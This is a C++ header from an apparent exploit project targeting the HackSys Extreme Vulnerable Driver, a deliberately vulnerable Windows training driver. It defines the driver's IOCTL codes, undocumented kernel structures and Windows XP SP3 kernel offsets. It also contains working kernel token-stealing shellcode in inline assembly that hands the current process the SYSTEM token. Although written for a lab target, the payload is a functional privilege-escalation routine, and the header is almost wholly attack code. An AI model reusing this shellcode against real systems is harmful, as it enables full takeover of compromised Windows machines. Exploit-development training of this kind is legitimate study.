#pragma once

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <memory>
#include <iomanip> 
#include <algorithm>

using namespace std;


#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_TYPE_CONFUSION                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80C, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_DOUBLE_FETCH                    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80D, METHOD_NEITHER, FILE_ANY_ACCESS)


#define SystemModuleInformation 11

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;
    PVOID MappedBase;
    DWORD ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;
 
typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

#define STR1(x) #x
#define STR(x)	STR1(x)

// Windows XP SP3 English, Bui;d 2600.xpsp.080413-2111, 5.1
#define KTHREAD_OFFSET		0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    	0x044  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         	0x084  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       	0x088  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       	0x0C8  // nt!_EPROCESS.Token
#define SYSTEM_PID         	0x004  // SYSTEM Process PID


extern "C" {
	//
	// GCC naked function being a Kernel Token stealing 
	// shellcode implementation, operating in the following manner:
	// 		1. Get the Kernel Processor Control Region current thread
	//		2. Get the _EPROCESS pointer from APC_STATE structure within _KTHREAD
	//		3. Store pointer of the current process' _EPROCESS structure
	// 		4. Search for process with system's pid = 4
	//			4a. Traverse ActiveProcessLinks.Flink pointers until you find PID=4
	//		5. Get system process' token value (_EPROCESS.Token)
	//		6. Replace target process' token with the system's one. 
	//		7. Write to the overwritten function pointer an address of ret 4 opcode,
	//			in order to avoid further crashes.
	//
	static void kernel_shellcode1() __attribute__ ((naked));
	static void kernel_shellcode1() {
		asm (
			"nop											\n\
			nop												\n\
			nop												\n\
			nop												\n\
			pushal											\n\
			xorl %%eax, %%eax								\n\
			movl %%fs:" STR(KTHREAD_OFFSET) "(%%eax), %%eax	\n\
			movl " STR(EPROCESS_OFFSET) "(%%eax), %%eax		\n\
			movl %%eax, %%ecx 								\n\
			movl $" STR(SYSTEM_PID) ", %%edx 				\n\
															\n\
		system_pid_lookup:									\n\
			movl " STR(FLINK_OFFSET) "(%%eax), %%eax		\n\
			subl $" STR(FLINK_OFFSET) ", %%eax 				\n\
			cmpl %%edx, " STR(PID_OFFSET) " (%%eax) 		\n\
			jne system_pid_lookup 							\n\
															\n\
			movl " STR(TOKEN_OFFSET) "(%%eax), %%edx		\n\
			movl %%edx, " STR(TOKEN_OFFSET) "(%%ecx) 		\n\
															\n\
			popal											\n\
			ret												\n"
			: : :
		);
	}
	
	static void kernel_shellcode1_end() {}
}

